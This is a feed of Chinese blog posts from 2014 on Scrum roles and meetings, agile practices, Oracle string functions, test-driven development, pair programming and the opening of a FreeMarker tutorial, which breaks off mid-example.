Scrum 总结, lcf19890121.iteye.com.blog.2064212, Fri, 09 May 2014 10:46:07 +0800
转自：http://www.cnblogs.com/astar/archive/2012/02/28/Scrum.html最近把之前学习 Scrum 的资料整理为一篇文档，在接下来的团队和项目开发中，根据项目的情况引入 Scrum 的一些实践，提高团队成员之间的协作能力和项目的交付质量。参考资料：《轻松Scrum之旅—敏捷开发故事》、《敏捷无敌》硝烟中的Scrum 和 XP火星人敏捷开发手册Scrum-Checklists维基百科：http://zh.wikipedia.org/wiki/ScrumScrum 工具禅道JIRA+GreenHopperScrum 中的角色Scrum Master——项目负责人、项目经理保护团队不受外界干扰，是团队的领导和推进者，负责提升 Scrum 团队的工作效率，控制 Scrum 中的“检视和适应”周期过程。与 Product Owner 一起将投资产出最大化，他确保所有的利益相关者都可以理解敏捷和尊重敏捷的理念。Team——开发人员、测试人员、美工设计、DBA等全职能性团队团队负责交付产品并对其质量负责，团队与所有提出产品需求的人一起工作，包括客户和最终用户，并共同创建 Product Backlog 。团队按照大家的共识来创建功能设计、测试 Backlog 条目交付产品。Product Owner——产品负责人、产品经理、运营人员从业务角度驱动项目，传播产品的明确愿景，并定义其主要特性。Product Owner 的主要职责是确保团队只开发对于组织最重要的 Backlog 条目，在 Sprint 中帮助团队完成自己的工作，不干扰团队成员，并迅速提供团队需要的所有信息。User——最终用户、运营人员、系统使用人员很多人都可能成为最终用户，比如市场部人员、真正的最终用户、最好的领域专家，也可能是因其专业知识而被雇佣的资讯顾问。最终用户会根据自己的业务知识定义产品，并告知团队自己的期望，提出请求。Manager——管理层、投资人管理层要为 Scrum 团队搭建良好的环境，以确保团队能够出色工作，必要的时候，他们也会与 Scrum Master 一起重新组织结构和指导原则。Customer——客户、系统使用人员、运营人员客户是为 Scrum 团队提出产品需求的人，她会与组织签订合同，以开发产品。一般来说，这些人是组织中的高级管理人员，负责从外部软件开发公司购买软件开发能力。在为内部产品的公司中，负责批准项目预算的人就是客户。Scrum 中的产出物Product Backlog——Backlog 待开发项，积压的任务。产品 Backlog 包括了所有需要交付的内容，其内容根据业务需求的价值顺序排列，每个 Backlog 的优先级是可以调整的，需求是可以增减的，因此产品 Backlog 将根据不断增长来持续驱动维护。Sprint Backlog——Sprint 本意为“冲刺”，指迭代周期，长度通常是一至六周。在 Sprint 开始前，定义本次 Sprint 要讨论的“Sprint Backlog”，从中产生本次 Sprint 要完成的 “已定 Product Backlog”。已定 Product BacklogSprint 计划会议的产物，它定义了团队所接受的工作量，在整个 Sprint 过程中它将保持不变。User Story、Task——用户故事、任务用 User Story 来描述 Sprint Backlog 里的项目，User Story 是从用户的角度对系统的某个功能模块所作的简短描述。一个 User Story 描述了项目中的一个小功能，以及这个功能完成之后将会产生什么效果，或者说能为客户创造什么价值。一个 User Story 的大小和复杂度应该以能在一个 Sprint 中完成为宜。如果 User Story 太大，可能会导致对它的开发横跨几个 Sprint，此时就应该将这个 User Story 分解。为了能够及时，高效地完成每个 Story，Scrum 团队会把每个 Story 分解成若干个 Task。每个Task 的时间最好不要超过8小时，保证在1个工作日内完成，如果 Task 的时间超过了8个小时，就说明Task的划分有问题，需要特别注意。障碍 Backlog——问题列表，积压的待处理事务。列举了所有团队内部和团队相关的和阻碍项目的进度的问题，Scrum Master 需要确保所有的障碍 Backlog 中的问题都已分配并可以得到解决。通用会议规则基本要求每次会议都要准时开始、准时结束。每次会议都采取开放形式，所有人都可以参加。会前准备提前邀请所有必须参会的人，让他们有时间准备。发送带有会议目标和意图的会议纲要。预订会议所需的全部资源：房间、投影仪、挂图、主持设备，以及此会议需要的其他东西。会前24小时发送提醒。准备带有会议规则的挂图。会议推进展开讨论时，会议的推进人必须在场。他不能参与到具体讨论中，但是他需要注意讨论进程，如果讨论参与者失去重点，他还要将讨论带回正规。推进人展示会议的目标和意图。有必要时，推进人可以商定由某个撰写会议记录。推进人可以记录团队的意见，或是教授团队如何自己记录文档；而且推进人可能会在挂图上进行记录，将对话可视化。推进人会对会议进行收尾，并进行非常简短的回顾。会议输出使用手写或挂图说明来记录文档，给白板和挂图上的内容拍照。必须传达会议记录和大家对会议结果的明确共同认知。让团队坐在一起！大家都懒的动，尽量让“产品负责人”和“全功能团队”都坐在一起！互相听到：所有人都可以彼此交谈，不必大声喊，不必离开座位。互相看到：所有人都可以看到彼此，都能看到任务板——不用非得近到可以看清楚内容，但至少可以看到个大概。隔离：如果你们整个团队突然站起来，自发形成一个激烈的设计讨论，团队外的任何人都不会被打扰到，反之亦然。团队建设Scrum 团队最佳人数控制在“5～9”人。全职能性团队：开发组（后台开发、前端开发、测试人员——3~8人）、Scrum Master（项目经理）、产品负责人兼职团队成员：美工、DBA、运维每日立会（Daily Standup Meeting）——建议下班前开始会议目的团队在会议中作计划，协调其每日活动，还可以报告和讨论遇到的障碍。任务板能够帮助团队聚焦于每日活动之上，要在这个时候更新任务板和燃尽图。构成部分任务板、即时贴、马克笔提示：ScrumMaster 不要站在团队前面或是任务板旁边，不要营造类似于师生教学的气氛。基本要求成员：团队、Scrum Master无法出席的团队成员要由同伴代表。持续时间/举办地点：每天15分钟，同样时间，同样地点。提示：团队成员在聆听他人发言时，都应该想这个问题：“我该怎么帮他做得更快？”会议输出团队彼此明确知道各自的工作，最新的工作进度图。得到最新的“障碍 Backlog”得到最新的“Sprint Backlog”会议过程团队聚在故事板旁边，可以围成环形。从左边第一个开始，向团队伙伴说明他到现在完成的工作。然后该成员将任务板上的任务放到正确的列中。如果可以的话，该成员可以选取新的任务，交将其放入“进行中工作”列。如果该成员遇到问题或障碍，就要将其报告给 Scrum Master。每个团队成员重复步骤2到步骤5。每个人三个问题：上次会议时的任务哪些已经完成？：把任务从“正在处理”状态转为“已完成”状态。——今天完成了什么？下次会议之前，你计划完成什么任务？：如果任务状态为“待处理”，转为“正在处理”状态。如果任务不在 Sprint Backlog 上，则添加这个任务。如果任务不能在一天成，把这任务细分成多个任务。如果任务可以在一天内完成，把任务状态设为“正在处理”。如果任务状态已经是“正在 处理”，询问是否存在阻碍任务完成得问题。——明天做什么？有什么问题阻碍了你的开发？：如果有阻碍你的开发进度的问题，把该障碍加入到障碍 Backlog中。——今天遇到了什么问题？注意事项不要迟到不要超出限制时间不要讨论技术问题不要转变会议话题不要在没有准备的情况下参加Scrum Master 不要替团队成员移动任务卡片，不要替团队更新燃尽图。Scrum Master 不要提出问题，团队成员不要向 Scrum Master 或管理层人员报告。如果不能出席会议，需要通知团队，并找一名代表参加。任务板任务板集合了选择好的 Product Backlog 和 Sprint Backlog，并以可视化方式展示。任务板只能由团队维护，使用不同颜色的“即时贴”来区分开发人员，或者在“即时贴”写上接受任务的姓名。尽量使用大白板，也可以使用软件。任务板有4列：选择好的 Product Backlog：按照优先级，将团队在当前 Sprint 中要着手的 Product Backlog 条目或是故事放在该列中。待完成的任务：要完成一个故事，你得完成一些任务。在 Sprint 规划会议中，或是在进行当前 Sprint 中，收集所有特定 Backlog 条目需要完成的新任务，并将它们放入该列。进行中的工作：当团队成员开始某个任务后，他会将该任务对应的卡片放到“进行中的工作”列中。从上个每日 Scrum 例会开始，没有完成的任务都会放在该列中，并在上面做标记（通常是个红点）。如果某个任务在“待完成任务”列中所处时间超过一天，就尽量将该任务分为更小 的部分，然后把新任务放到那一列，移除其所属大任务卡片。如果一个新任务因为某个障碍无法完成，就会得到一个红点标记，Scrum Master 就会记下一个障碍。完成：当一个任务卡完成后，完成此任务的成员将其放入“完成”列，并开始选取下一张任务卡。 燃尽图（Burn Down Chart）跟踪进度要由团队来完成，燃尽图的横轴表示整个Sprint 的总时间，纵轴表示 Sprint 中所有的任务，其单位可以是小时，人天等。一般来说，燃尽图有”Sprint燃尽图”和”Release燃尽图”之分。团队每天更新燃尽图。如果燃尽图一直是上升状态，或当 Sprint 进行一段时间之后，Sprint 燃尽图上的Y值仍然与 Sprint 刚开始时相差无几，就说明这个 Sprint 中的 Story 过多，要拿掉一些 Story 以保证这个 Sprint 能顺利完成。 如果Sprint 燃尽图下降得很快，例如 Sprint 刚过半时Y值已经接近0了，则说明这个 Sprint 分配的任务太少，还要多加一些任务进来。在 Sprint 计划会议上，如果团队对即将要做的任务理解和认识不充分，就很可能导致这两种情况的出现。（锻炼团队人员的自我估算时间）燃尽图要便于团队更新，没必要让它看起来很炫，也不要过于复杂，难以维护。Release 燃尽图：记录整个Scurm项目的进度，它的横轴表示这个项目的所有Sprint， 纵轴表示各个Sprint开始前，尚未完成的工作，它的单位可以是个（Story 的数量），人天等。 Sprint 规划会议——第一部分（上午）会议目的该会议的工作以分析为主，目的是要详细理解最终用户到底要什么，产品开发团队可以从该会议中详细了解最终用户的真实需要。在会议的结束，团队将会决定他们能够交付哪些东西。产品负责人在会前准备：条目化的需求（用户故事），优先级排序，最近1~2个迭代最希望看到的功能。会前准备至关重要，可帮助产品负责人理清头绪，不至于在迭代期内频繁提出变更、增加或删除故事。基本要求迭代计划会在每个迭代第一天召开，目的是选择和估算本次迭代的工作项。只有团队成员才能决定团队在当前 Sprint 中能够领取多少个 Backlog 条目的工作。构成部分：经过估算和排序的 Product Backlog。挂图、马克笔、剪刀、胶水、即时贴、白板、铅笔和蜡笔。假期计划表、重要人员的详细联系信息。参会成员：团队成员、Scrum Master、产品负责人持续时间：在 Sprint 中，每周该会议占用时间为 60 分钟，在早上召开该会议，这样还有可能在同一天召开 Sprint 规划会议的第二部分。会议输出选择好的 Product Backlog 条目。各个 Backlog 条目的需求。各个 Backlog 条目的用户验收测试。会议过程从第一个 Product Backlog 条目（故事）开始。讨论该 Product Backlog 条目，以深入理解。分析、明确用户验收测试。找到非功能性需求（性能、稳定性...）找到验收条件。弄清楚需要“完成”到何种水平。获得 Backlog 条目各个方面的清晰了解。绘制出所需交付物的相关图表，包括流程图、UML图、手绘草图、屏幕 UI 设计等。回到步骤1，选取下一个 Backlog 条目。流程检查：询问团队能否快速回答下列问题，只需要简要回答即可：“我们能 在这个 Sprint 中完成第一个 Backlog 条目吗？”如果能得到肯定的回答，那么继续询问下一个 Backlog 条目，一直到已经分析完的最后一个 Backlog 条目。——接下来，休息一下。在休息后，对下一个 Backlog 条目展开上述流程。结束流程：在 Sprint 规划会议第一部分结束前留出 20 分钟。再次提问——这次要更加严肃、正式：“你们能否完成第一个 Backlog 条目，...第二个，...？”如果团队认为他们不能再接受更多的 Backlog 条目，那就停下来。现在是非常重要的一步：送走 Product Owner，除了团队和 Scrum Master 之外的所有人，都得离开。当其他人都离开后，再询问团队：“说真的——你们相信自己可以完成这个列表？”希望团队现在能短暂讨论一下，看看他们到底认为自己能完成多少工作。将结果与 Product Owner 和最终用户沟通。注意事项：不要改变 Backlog 条目大小，不要估算任务。Sprint 规划会议——第二部分（下午）会议目的该会议的工作以设计为主，产品开发团队可以为他们要实现的解决方案完成设计工作，在会议结束后，团队知道如何构建他们在当前 Sprint 中要开发的功能。基本要求只有产品开发团队才能制定解决方案，架构师或其他团队之外的人只是受邀帮助团队。构成部分：能够帮助团队在该 Sprint 中构建解决方案的人，比如厂商或是来自其他团队的人员。选择好的 Product Backlog 条目。挂图......注意事项：不要估算任务，不要分配任务。会议输出应用设计、架构设计图、相关图表确保团队知道应该如何完成任务！会议过程从第一个 Backlog 条目开始。查看挂图，确定对于客户的需求理解正确。围绕该 Backlog 条目进行设计，并基于下列类似问题： 我们需要编写什么样的接口？我们需要创建什么样的架构？我们需要更新哪些表？我们需要更新或是编写哪些组件？......当团队明确知道自己应该如何开发该功能后，就可以转向下一个 Backlog 条目了。在会议的最后 10 分钟，团队成员使用即时贴写出初步的任务。这能帮助团队成员知道接下来的工作从哪里开展，将这些任务放在任务板上。持续时间：在 Sprint 规划会议第一部分完成后，召开该会议。可以将午餐作为两次会议的一个更长久的休息。但是要在同一天完成 Sprint 规划第一部分，在 Sprint 中，每周该会议占用时间为 60 分钟。估算会议——根据项目情况合并到 Sprint 第二部分会议会议目的要做好战略规划，你需要知道 Backlog 中各项的大小，这是版本规划的必要输入；如果想知道团队在一个 Sprint 中能够完成多少工作，这个数据也是必须的。团队成员可以从会议中知道项目接下来的阶段会发生哪些事情。基本要求只有团队才能作估算，Product Owner（产品负责人）需要在场，以帮助判定某些用户故事能否拆分为更小的故事。构成部分：Product Owner 根据业务价值排定 Product Backlog 各项顺序。需要参加的人员：Team、Product Owner、User、Scrum Master注意事项：不要估算工作量大小——只有团队能这么做。Product Owner 不参与估算。会议过程Prodcut Owner 展示她希望得到估算的 Product Backlog 条目。团队使用规划扑克来估算 Backlog 条目。如果某个 Backlog 条目过大，需要放到下一个或是后续的 Sprint 中，团队就会将该大 Backlog 条目划分为较小的几个 Backlog 条目，并对新的 Backlog 条目使用规划扑克进行估算。重新估算 Backlog 中当前没有完成、但是可能会在接下来三个 Sprint 中要完成的条目。持续时间：该会议时间限制为不超过90分钟。如果 Sprint 持续时间长于一周，那么每个 Sprint 举行两次估算会议比较合适。会议输出经过估算的 Product Backlog。更小的 Backlog 条目。扑克牌估算（Planning Poker）具体步骤：每个人各自估算后独立出暗牌，听口令一起开牌。数值最大者与最小者PK，其他人旁听也可参考。讨论结束后重新出牌和开牌。重复上述过程，直到结果比较接近。常见问题1、为什么任务要分给组而不是个人？答：因为怕出错了牌又说不出所以然，这样即使日后他不做这个功能，也对这个功能很了解。2、为什么不让最后领任务的人自己估算？答：因为他很可能因为不知道某代码可用、不知道某软件不行....而选择了错误的实现方法。3、为什么不让师傅估算大家采纳，他不是最厉害吗？答：师傅的想法常常是徒弟们理解不了的，比如为什么不留在女儿国而偏偏去西天取经之类的，共同估算就是让大家在思考中对照自己的实现方法和师傅差异的过程。Sprint 评审会议（Review Meeting）——根据项目需要举行会议目的Scrum 团队在会议中向最终用户展示工作成果，团队成员希望得到反馈，并以之创建或变更 Backlog 条目。基本要求Sprint 复审会议允许所有的参与者尝试由团队展示的新功能。构成部分有可能发布的产品增量，由团队展示。会议输出来自最终用户的反馈。障碍 Backlog 的输入。团队 Backlog 的输入。来自团队的反馈为 Product Backlog 产生输入。持续时间：90分钟，在 Sprint 结束时进行。会议过程Product Owner 欢迎大家来参加 Sprint 复审会议。Product Owner 提醒大家关于本次 Sprint 的目的：Sprint 目标、Scrum 团队在本次 Sprint 中选定要开发的故事。产品开发团队展示新功能，并让最终用户尝试新功能。Scrum Master 推进会议进程。最终用户的反馈将会由 Product Owner 和/或 Scrum Master 记录在案。注意事项：不要展示不可能发布的产品增量。Scrum Master 不要负责展示结果。团队不要针对 Product Owner 展示。Sprint 反思会议（Retrospective Meetin）——根据项目需要举行会议目的该会议的对应隐喻：医疗诊断！其目的不是为了找到治愈方案，而是要发现哪些方面需要改进。构成部分参与人员：团队成员、Scrum Master基本要求从过去中学习，指导将来。改进团队的生产力。注意事项不要让管理层人员参与会议。不要在团队之外讨论找到的东西。会议输出障碍 Backlog 的输入。团队 Backlog 的输入。持续时间：90分钟，在 Sprint 评审会议结束后几分钟开始。会议过程准备一个写着“过去哪些做的不错？”的挂图。准备一个写着“哪些应该改进？”的挂图。绘制一条带有开始和结束日期的时间线。给每个团队成员发放一叠即时贴。开始回顾。做一个安全练习。收集事实：发放即时贴，用之构成一条时间线。每个团队成员（包括 Scrum Master）在每张即时贴上写上一个重要的事件。“过去哪些做的不错？”：采取收集事实同样的过程，不过这次要把即时贴放在准备好的挂图上。做一个分隔，以区分“过去哪些做的不错”和接下来要产出的东西。“哪些应该改进？”：像“过去哪些做的不错”那样进行。现在将即时贴分组：我们能做什么》团队 Backlog 的输入。哪些不在我们掌控之内？》障碍 Backlog 的输入。根据团队成员的意见对两个列表排序。将这两个列表作为下个 Sprint 的 Sprint 规划会议第一部分和 Sprint 规划会议第二部分的输入，并决定到时候要如何处理这些发现的信息。附两张流程图（资料截图）  
    本文附件下载:
    
      scrum.zip (161 KB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
敏捷开发, lcf19890121.iteye.com.blog.2064195, Fri, 09 May 2014 10:25:35 +0800
Agile——敏捷开发，作为CMM神话崩溃后被引入的一套新的软件开发模式，这几年来被广泛引起关注，并被寄予厚望。敏捷开发宣言——个体和交互 胜过 过程和工具可以工作的软件 胜过 面面俱到的文档客户合作 胜过 合同谈判响应变化 胜过 遵循计划虽然右项也有价值，但是我们认为左项具有更大的价值。 以上的宣言比较抽象，基于该理念，以下是敏捷开发实践：Iteration迭代开发。可以工作的软件胜过面面俱到的文档。因此，敏捷开发提倡将一个完整的软件版本划分为多个迭代，每个迭代实现不同的特性。重大的、优先级高的特性优先实现，风险高的特性优先实现。在项目的早期就将软件的原型开发出来，并基于这个原型在后续的迭代不断晚上。迭代开发的好处是：尽早编码，尽早暴露项目的技术风险。尽早使客户见到可运行的软件，并提出优化意见。可以分阶段提早向不同的客户交付可用的版本。IterationPlanningMeeting迭代计划会议。每个迭代启动时，召集整个开发团队，召开迭代计划会议，所有的团队成员畅所欲言，明确迭代的开发任务，解答疑惑。Story Card/Story Wall/Feature List在每个迭代中，架构师负责将所有的特性分解成多个Story Card。每个Story可以视为一个独立的特性。每个Story应该可以在最多1个星期内完成开发，交付提前测试（Pre-Test）。当一个迭代中的所有Story开发完毕以后，测试组再进行完整的测试。在整个测试过程中（pre-test，test），基于Daily build，测试组永远都是每天从配置库上取下最新编译的版本进行测试，开发人员也随时修改测试人员提交的问题单，并合入配置库。敏捷开发的一个特点是开放式办公，充分沟通，包括测试人员也和开发人员一起办公。基于Story Card的开发方式，团队会在开放式办公区域放置一块白板，上面粘贴着所有的Story Card，按当前的开发状态贴在4个区域中，分别是：未开发，开发中，预测试中，测试中。Story Card的开发人员和测试人员根据开发进度在Story Wall上移动Story Card，更新Story Card的状态。这种方式可以对项目开发进度有一个非常直观的了解。在开发人员开始开发一个Story时，ta需要找来对应的测试人员讲解Story功能，以便测试人员有一致的理解，同时开始自动化系统测试脚本的开发。Standup Meeting站立会议。每天早上，所有的团队成员围在Story Wall周围，开一个高效率的会议，通常不超过15分钟，汇报开发进展，提出问题，但不浪费所有人的时间立刻解决问题，而是会后个别沟通解决。Pair Programming结对编程是指两个开发人员结对编码。结对编程的好处是：经过两个人讨论后编写的代码比一个人独立完成会更加的完善，一些大的方向不至于出现偏差，一些细节也可以被充分考虑到。一个有经验的开发人员和一个新手结对编程，可以促进新手的成长，保证软件开发的质量。CI/Daily Build持续集成和每日构建能力是否足够强大是迭代开发是否成功的一个重要基础。基于每日构建。开发人员每天将编写/修改的代码及时的更新到配置库中，自动化编译程序每天至少一次自动从配置库上取下代码，执行自动化代码静态检查（如PCLint），单元测试，编译版本，安装，系统测试，动态检查（如Purify）。以上这些自动化任务执行完毕后，会输出报告，自动发送邮件给团队成员。如果其中存在着任何的问题，相关责任人应该及时的修改。可以看到，整个开发组频繁的更新代码，出现一些问题不可避免。通过测试部又在不停地基于最新的代码进行测试。新增的问题是否能够被及时发现并消灭掉，取决于自动化单元测试和系统测试能力是否足够强大，特别是自动化系统测试能力。如果自动化测试只能验证最简单的操作，则新合入代码的隐患将很难被发现，并遗留到项目后期，形成大的风险。而实际上，提升自动化测试的覆盖率是最困难的。Retrospect总结和反思。每个迭代结束以后，项目组成员召开总结会议，总结好的实践和教训，并落实到后续的开发中。ShowCase演示。每个Story开发完成以后，开发人员叫上测试人员，演示软件功能，以便测试人员充分理解软件功能。Refactoring重构。因为迭代开发模式在项目早期就开发出可运行的软件原型，一开始开发出来的代码和架构不可能是最优的、面面俱到的，因此在后续的Story开发中，需要对代码和架构进行持续的重构。迭代开发对架构师要求很高。因为架构师要将一个完整的版本拆分成多个迭代，每个跌倒由拆分成很多Story，从架构的角度看，这些Story必须在是有很强的继承性，是可以不断叠加的，不至于后续开发的Story完全推翻了早期开发的代码和架构，同时也不可避免的需要对代码进行不断完善，不断重构。TDD测试驱动开发。正如上面讲的，迭代开发的特点是频繁合入代码，频繁发布版本。测试驱动开发是保证合入代码正常运行且不会在后期被破坏的重要手段。这里的测试主要指单元测试。敏捷方法反思：自己参与的敏捷开发项目总的来说不是很成功，这可能也是业界遇到的通病：1、对于全新的软件，在项目早期测试人员就参与并实现自动化测试脚本，但实际上软件的界面等非常不稳定，导致测试人员返工的工作量很大。2、对于全新的软件，资料人员过早参与，后期返工工作量大，原因同第一点。3、自动化系统测试工作量大，测试人员投入大量的精力在使测试自动化起来，而没有足够的精力放在真正的测试软件的功能是否正常。即便是这样，自动化系统测试脚本也多流于形式，测不出深层次的问题。4、代码动态检查工具执行不理想，流于形式。没有人对Purify有深刻的理解和应用经验，报告中查出来很多告警，但不知如何消除。5、由于快速搭建原型，没有在架构上进行严谨的设计，导致后期一直堆砌代码。6、异地开发模式下无法实现快速构建、快速交付，团队普遍感觉很疲惫。7、敏捷开发不提倡加班，但实际上不管是CMM还是Agile哪一种开发模式跟是否加班都没有必然联系。
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
oracle中substr函数以及字符串长度函数使用, lcf19890121.iteye.com.blog.2064191, Fri, 09 May 2014 10:20:30 +0800
1、substr(string string, int a, int b) 参数1:string 要处理的字符串 参数2：a 截取字符串的开始位置（起始位置是0） 参数3：b 截取的字符串的长度(而不是字符串的结束位置) 例如： substr("ABCDEFG", 0, 3); //返回：ABC，截取从A开始3个字符 substr("ABCDEFG", 0, 100); //返回：ABCDEFG，100虽然超出预处理的字符串最长度，但不会影响返回结果，系统按预处理字符串最大数量返回。 substr("ABCDEFG", -3, 3); //返回：EFG，注意参数-3，为负值时表示从尾部开始算起，字符串排列位置不变。  2、substr(string string, int a)  参数1:string 要处理的字符串 参数2：a 可以理解为从索引a（注意：起始索引是0）处开始截取字符串，也可以理解为从第 （a+1）个字符开始截取字符串。 例如： substr("ABCDEFG", 0); //返回：ABCDEFG, 截取所有字符 substr("ABCDEFG", 2); //返回：BCDEFG，截取A之后所有字符 3.length()和lengthb();lengthb(string)计算string所占的字节长度 :返回字符串的长度，单位是字节;length(string)计算string所占的字符长度 :返回字符串的长度，单位是字符; 用法举例：1.可以用length(‘string’)=lengthb(‘string’)判断字符串是否含有中文;2.select length('我') from dual   --返回1  select lengthb('我') from dual  --返回2  select length('AB') from dual   --返回2  select lengthb('AB') from dual  --返回2
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Test-Driven Development(测试驱动开发), lcf19890121.iteye.com.blog.2061971, Tue, 06 May 2014 10:36:39 +0800
TDD的基本思路 是通过测试来推动整个开发的进行。 　　优势： 　　1.通过编写测试用例 可以确保对需求描述的无二意（无歧义） 　　2.编写测试用例  也是一种代码设计的过程 　　3.测试用例是对代码的最好的解释 　　4.测试驱动开发提供的测试集就可以作为你编码信心的来源 　　5.测试用例可以保障代码的正确性，能够迅速发现、定位bug 　　过程： 　　测试驱动开发的基本过程如下： 　　1） 明确当前要完成的功能。可以记录成一个 TODO 列表。 　　2） 快速完成针对此功能的测试用例编写。 　　3） 测试代码编译不通过。 　　4） 编写对应的功能代码。 　　5） 测试通过。 　　6） 对代码进行重构，并保证测试通过。 　　7） 循环完成所有功能的开发。 　　TDD的原则： 　　1） 测试隔离。不同代码的测试应该相互隔离。对一块代码的测试只考虑此代码的测试，不要考虑其实现细节（比如它使用了其他类的边界条件）。 　　2） 测试列表。需要测试的功能点很多。应该在任何阶段想添加功能需求问题时，把相关功能点加到测试列表中，然后继续手头工作。 　　3） 先写断言。测试代码编写时，应该首先编写对功能代码的判断用的断言语句，然后编写相应的辅助语句。 　　4） 可测试性。功能代码设计、开发时应该具有较强的可测试性。其实遵循比较好的设计原则的代码都具备较好的测试性。 　　5） 及时重构。无论是功能代码还是测试代码，对结构不合理，重复的代码等情况，在测试通过后，及时进行重构. 　　6） 小步前进。软件开发是个复杂性非常高的工作，开发过程中要考虑很多东西，包括代码的正确性、可扩展性、性能等等，很多问题都是因为复杂性太大导致的。 　　测试技术： 　　怎么编写测试用例 　　测试用例的编写就用上了传统的测试技术。 　　* 操作过程尽量模拟正常使用的过程。 　　* 全面的测试用例应该尽量做到分支覆盖，核心代码尽量做到路径覆盖。 　　* 测试数据尽量包括：真实数据、边界数据。 　　* 测试语句和测试数据应该尽量简单，容易理解。 　　* 为了避免对其他代码过多的依赖，可以实现简单的桩函数或桩类（Mock Object）。 　　* 如果内部状态非常复杂或者应该判断流程而不是状态，可以通过记录日志字符串的方式进行验证。     * 职责转变 - 某些开发人员认为，他的工作就是实现功能，写代码；测试只是测试人员的事情，不在他的职责范围内。这是错误的认识，完备高质量的单元测试也是开发人员的职责！     * 思维转变 - 很多开发人员拿到需求后，喜欢立刻就埋头开始写代码实现。TDD要求测试为先，开发人员首先要思考的不再是功能如何实现，而是应该如何去进行验证，并列出需要的测试场景。这是一个大的逆向思维转变。     * 需求分析能力 - TDD比传统的编程方法需要开发人员具备更强的需求分析能力，要求开发人员对业务有跟深入的理解。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Pair Programming & Simple Design, lcf19890121.iteye.com.blog.2061956, Tue, 06 May 2014 10:19:49 +0800
摘自：http://www.blogjava.net/raimundox/archive/2007/03/27/106669.htmlpair programing是所有XP实践中争议最大的一个，但窃以为确实XP实施的关键关键实践之一，甚至于，我认为很多XP实施的失败都是由于没有采用pair programming而造成的。要了解pair为什么重要，就要了解pair的目的在何。当然了，大多数人都知道pair的重点在于知识传递，知识共享，持续走查，降低代码缺陷等等等等。这些都是pair的优点，不过最重要的一点却常常被忽略——pair programing的最直接而又最根本的目的之一在于simple design。 上图是著名的Ron Jefferies Model，可以看到XP最佳实践被划分成了一个一个的圆圈，而pair, TDD, refactor和simple design位于中心。这并不是说这四个实践就是xp的核心。jefferies model每一圈代表了xp实践过程中的不同关注点，最中心的是dev视角，其次是team视角，最外层是交付／管理视角。每圈上的最佳时间多少都有些紧耦合，放开其他的不讲，我们专门说说dev圈，pair programing, tdd, refactor和simple design。 这四个实践里只有simple design最虚也最重要。有一个问题已经被问过无数次了，“到底多simple的design才叫simple”。我对此也有一个近乎刻板的回答：team里所有人员都能够理解的design就是simple的。一旦立了标准，这四个实践的主从关系就一下子清晰起来——simple design是这四个实践的核心，其他三个实践都是它服务的。 首先做出一个设计，最简单的判断标准就是是否可测，一个不可测的设计基本上可以认为无法实现，于是TDD即是simple design的质量保证又是simple design的直觉验证。 refactor是为了得到好的代码，那么什么是好的代码？simple design!!!这里有人不同意了，有人说只是要易于修改和扩展，可是扩展和修改也要别人看得懂才行啊...simple design是起码的要求嘛。实际上，XP中的refactor就是朝着simple design的方向重构过去的，也就是朝着所有人都能理解的代码refactor过去的。插一句题外话，为啥说好的架构的不是设计出来的呢？因为好的架构至少应该是simple design的，而simple的概念有和人员相关...所以当你极尽能事show off你的pattern知识之后，得到复杂设计根本就不可能是好的架构。时刻紧记，架构是妥协啊... 最后，pair programming是simple design的实际检验！！！因为即便是最复杂的设计，只要是你自己想出来的，你都觉得它简单无比，里面充满了直白且显而易见的理由。可惜不幸的是，我们要的简单，是对team里所有人的简单。如果你的pair不能理解你的设计，那么说明你的设计复杂了;如果你们两个人懂，但是swith pair的时候，换过来的人不懂，说明你的设计复杂了。pair programming(以及他那容易让人忽略的子实践switching pair)就是检验simple design的过程。pair programing + refactor就是时刻保证simple design防止过渡设计反攻倒算的过程。pair programming + refactor + tdd就是团结在以Deming同学built quality in的质量大旗下，坚定地与过渡设计做斗争的过程。据我观察，至没有使用pair programming的团队中，少一半simple design成了口号，而这一半中，至少又有一半最终放弃了xp放弃了敏捷（俺以前带过的团队就有这样的...默哀一下）。深刻的教训啊，我们来高呼一下："pair programming是检验simple design的唯一标准！"。 最后说一下pair programming经济学，过多的假设我就不讲了。单说一点，有哪一位上班的8小时从来不上msn/yahoo/qq等im?有哪一位上班从来不上论坛/不回贴/不发邮件?以我pair的经验来看，pair programming的过程中，两个人几乎不会用im，几乎不会逛论坛。你不好意思呀，毕竟不是你一个人的机器，毕竟是两个人的时间，毕竟你也不愿意给同事一种懒散的印象吧？收回的这么浪费的时间，至少顶得过另外一个人的工作时间了吧？
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
FreeMarker使用教程, lcf19890121.iteye.com.blog.2055958, Mon, 28 Apr 2014 08:56:22 +0800
作者：永恒の_☆ 地址：http://blog.csdn.net/chenghui0317/article/details/7832474一、Freemarker的介绍     Freemarker 是一款模板引擎，是一种基于模版生成静态文件的通用 工具，它是为java程序员提供的一个开发包，或者说是一个类库，它不是面向最终用户的，而是为程序员提供了一款可以嵌入他们开发产品的应用程序。     Freemarker 是使用纯java编写的，为了提高页面的访问速度，需要把页面静态化， 那么Freemarker就是被用来生成html页面。     到目前为止，Freemarker使用越来越广泛，不光光只是它强大的生成技术，而且它能够与spring进行很好的集成。     现在开始一层层揭开它的神秘面纱。。  二、Freemarker的准备条件     freemarker.2.3.16.jar   下载地址：http://download.csdn.net/detail/ch656409110/4494067 (这个jar包其实在struts2里面)  三、Freemarker生成静态页面的原理     Freemarker 生成静态页面，首先需要使用自己定义的模板页面，这个模板页面可以是最最普通的html，也可以是嵌套freemarker中的 取值表达式， 标签或者自定义标签等等，然后后台读取这个模板页面，解析其中的标签完成相对应的操作， 然后采用键值对的方式传递参数替换模板中的的取值表达式，做完之后 根据配置的路径生成一个新的html页面， 以达到静态化访问的目的。  四、Freemarker提供的标签 Freemarker提供了很多有用 常用的标签，Freemarker标签都是<#标签名称>这样子命名的，${value} 表示输出变量名的内容 ，具体如下： 1、list：该标签主要是进行迭代服务器端传递过来的List集合，比如：[html] view plaincopyprint?     <#list nameList 